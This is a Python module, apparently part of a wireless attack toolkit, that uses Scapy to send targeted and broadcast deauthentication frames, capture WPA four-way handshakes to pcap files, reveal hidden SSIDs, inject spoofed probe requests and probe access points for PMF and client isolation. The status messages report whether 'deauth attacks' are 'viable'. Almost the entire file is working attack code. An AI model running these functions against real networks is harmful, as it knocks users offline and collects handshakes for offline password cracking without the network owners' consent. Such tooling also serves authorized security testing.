"""Native packet operations with Scapy — deauth, beacon, probe, handshake parsing."""

from __future__ import annotations

import contextlib
import random
import time
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from ..core.logger import get_logger

console = Console()
log = get_logger("packets")

try:
    from scapy.all import (
        EAPOL,
        Dot11,
        Dot11Beacon,
        Dot11Deauth,
        Dot11Elt,
        Dot11ProbeReq,
        Dot11ProbeResp,
        RadioTap,
        sendp,
        sniff,
        wrpcap,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


@dataclass
class BeaconInfo:
    bssid: str
    essid: str
    channel: int
    encryption: str
    power: int


def check_scapy() -> bool:
    if not SCAPY_AVAILABLE:
        console.print("[red]Scapy not available — install with: pip install scapy[/red]")
    return SCAPY_AVAILABLE


def deauth(
    interface: str,
    target_mac: str,
    ap_mac: str,
    count: int = 3,
    interval: float = 0.1,
    jitter: bool = True,
) -> int:
    if not check_scapy():
        return 0

    console.print(
        f"[yellow]Sending {count} deauth frames: "
        f"{target_mac} ↔ {ap_mac}[/yellow]"
    )

    pkt_to_client = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )
    pkt_to_ap = (
        RadioTap() /
        Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )

    sent = 0
    for _i in range(count):
        sendp(pkt_to_client, iface=interface, verbose=False)
        sendp(pkt_to_ap, iface=interface, verbose=False)
        sent += 2

        if jitter:
            time.sleep(interval + random.uniform(0, interval * 0.5))
        else:
            time.sleep(interval)

    console.print(f"[dim]Sent {sent} deauth frames[/dim]")
    return sent


def deauth_broadcast(
    interface: str,
    ap_mac: str,
    count: int = 5,
    interval: float = 0.1,
) -> int:
    if not check_scapy():
        return 0

    pkt = (
        RadioTap() /
        Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )

    sent = 0
    for _ in range(count):
        sendp(pkt, iface=interface, verbose=False)
        sent += 1
        time.sleep(interval)

    return sent


def scan_beacons(
    interface: str,
    duration: int = 30,
    channel: int | None = None,
) -> list[BeaconInfo]:
    if not check_scapy():
        return []

    beacons: dict[str, BeaconInfo] = {}

    def process_packet(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return

        bssid = pkt[Dot11].addr2
        if bssid in beacons:
            return

        essid = ""
        channel = 0
        encryption = "OPEN"

        stats = pkt[Dot11Beacon].network_stats()
        if stats:
            essid = stats.get("ssid", "")
            channel = stats.get("channel", 0)
            crypto = stats.get("crypto", set())
            if crypto:
                encryption = "/".join(crypto)

        elt = pkt[Dot11Elt]
        while elt:
            if elt.ID == 0:
                with contextlib.suppress(Exception):
                    essid = elt.info.decode("utf-8", errors="ignore")
            elif elt.ID == 3:
                with contextlib.suppress(Exception):
                    channel = int.from_bytes(elt.info, "big")
            elt = elt.payload if hasattr(elt.payload, "ID") else None

        power = getattr(pkt, "dBm_AntSignal", -100) if hasattr(pkt, "dBm_AntSignal") else -100

        beacons[bssid] = BeaconInfo(
            bssid=bssid, essid=essid, channel=channel,
            encryption=encryption, power=power,
        )

    with Progress(
        SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(), console=console,
    ) as progress:
        progress.add_task(f"Sniffing beacons ({duration}s)...", total=None)
        sniff(
            iface=interface, prn=process_packet,
            timeout=duration, store=False,
        )

    console.print(f"[green]Captured {len(beacons)} unique beacons[/green]")
    return list(beacons.values())


def capture_handshake(
    interface: str,
    bssid: str,
    output_file: str,
    timeout: int = 120,
) -> bool:
    if not check_scapy():
        return False

    handshake_packets = []
    eapol_count = 0

    def process_packet(pkt):
        nonlocal eapol_count
        if pkt.haslayer(EAPOL) and (pkt[Dot11].addr1 == bssid or pkt[Dot11].addr2 == bssid):
            handshake_packets.append(pkt)
            eapol_count += 1
            console.print(f"[green]EAPOL frame {eapol_count}/4 captured[/green]")

    with Progress(
        SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(), console=console,
    ) as progress:
        progress.add_task(f"Capturing handshake for {bssid}...", total=None)
        sniff(
            iface=interface,
            prn=process_packet,
            timeout=timeout,
            store=False,
            lfilter=lambda p: p.haslayer(Dot11) and (
                p[Dot11].addr1 == bssid or p[Dot11].addr2 == bssid
            ),
        )

    if eapol_count >= 2:
        wrpcap(output_file, handshake_packets)
        console.print(f"[green bold]Handshake captured → {output_file}[/green bold]")
        return True

    console.print("[yellow]Incomplete handshake[/yellow]")
    return False


def detect_hidden_ssid(
    interface: str,
    bssid: str,
    duration: int = 60,
) -> str | None:
    if not check_scapy():
        return None

    found_ssid = None

    def process_packet(pkt):
        nonlocal found_ssid
        if found_ssid:
            return

        if pkt.haslayer(Dot11ProbeResp) and pkt[Dot11].addr2 == bssid:
            elt = pkt[Dot11ProbeResp].payload
            if hasattr(elt, "ID") and elt.ID == 0:
                try:
                    ssid = elt.info.decode("utf-8", errors="ignore")
                    if ssid:
                        found_ssid = ssid
                        console.print(f"[green bold]Hidden SSID revealed: {ssid}[/green bold]")
                except Exception:
                    pass

    sniff(
        iface=interface, prn=process_packet,
        timeout=duration, store=False,
    )

    return found_ssid


def inject_probe_request(
    interface: str,
    essid: str,
    source_mac: str | None = None,
) -> None:
    if not check_scapy():
        return

    if not source_mac:
        source_mac = f"00:{random.randint(0,255):02x}:{random.randint(0,255):02x}:" \
                     f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"

    pkt = (
        RadioTap() /
        Dot11(
            type=0, subtype=4,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=source_mac,
            addr3="ff:ff:ff:ff:ff:ff",
        ) /
        Dot11ProbeReq() /
        Dot11Elt(ID=0, info=essid.encode())
    )

    sendp(pkt, iface=interface, verbose=False)


def detect_pmf(
    interface: str,
    bssid: str,
    duration: int = 30,
) -> dict:
    """Detect 802.11w Protected Management Frames on target AP."""
    if not check_scapy():
        return {"pmf_capable": False, "pmf_required": False, "error": "scapy unavailable"}

    result = {"pmf_capable": False, "pmf_required": False, "bssid": bssid}

    def process_packet(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return
        if pkt[Dot11].addr2 != bssid:
            return

        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 48 and elt.info and len(elt.info) >= 8:
                rsn_bytes = elt.info
                try:
                    offset = 2  # version
                    offset += 4  # group cipher
                    pw_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
                    offset += 2 + (pw_count * 4)
                    akm_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
                    offset += 2 + (akm_count * 4)

                    if offset + 2 <= len(rsn_bytes):
                        caps = int.from_bytes(rsn_bytes[offset:offset+2], "little")
                        result["pmf_capable"] = bool(caps & (1 << 6))
                        result["pmf_required"] = bool(caps & (1 << 7))
                        result["rsn_caps_raw"] = f"0x{caps:04x}"
                except (IndexError, ValueError):
                    pass
                return

            elt = elt.payload if hasattr(elt.payload, "ID") else None

    console.print(f"[cyan]Checking PMF status for {bssid} ({duration}s)...[/cyan]")

    sniff(
        iface=interface, prn=process_packet,
        timeout=duration, store=False,
        lfilter=lambda p: p.haslayer(Dot11Beacon),
    )

    if result["pmf_required"]:
        console.print(f"[red bold]PMF REQUIRED on {bssid} — deauth attacks will NOT work[/red bold]")
    elif result["pmf_capable"]:
        console.print(f"[yellow]PMF capable on {bssid} — deauth may fail on PMF clients[/yellow]")
    else:
        console.print(f"[green]No PMF on {bssid} — deauth attacks viable[/green]")

    return result


def detect_client_isolation(
    interface: str,
    ap_mac: str,
    client1_mac: str,
    client2_mac: str,
    timeout: int = 5,
) -> bool:
    """Test if AP blocks inter-client traffic."""
    if not check_scapy():
        return False

    pkt = (
        RadioTap() /
        Dot11(
            type=2, subtype=0,
            addr1=ap_mac,
            addr2=client1_mac,
            addr3=client2_mac,
            FCfield=0x01,
        )
    )

    sendp(pkt, iface=interface, verbose=False, count=3)

    received = []

    def check_response(p):
        if p.haslayer(Dot11) and p[Dot11].addr1 == client2_mac:
            received.append(p)

    sniff(iface=interface, prn=check_response, timeout=timeout, store=False)

    isolated = len(received) == 0
    if isolated:
        console.print("[yellow]Client isolation detected — inter-client traffic blocked[/yellow]")
    else:
        console.print("[green]No client isolation — inter-client traffic passes[/green]")

    return isolated
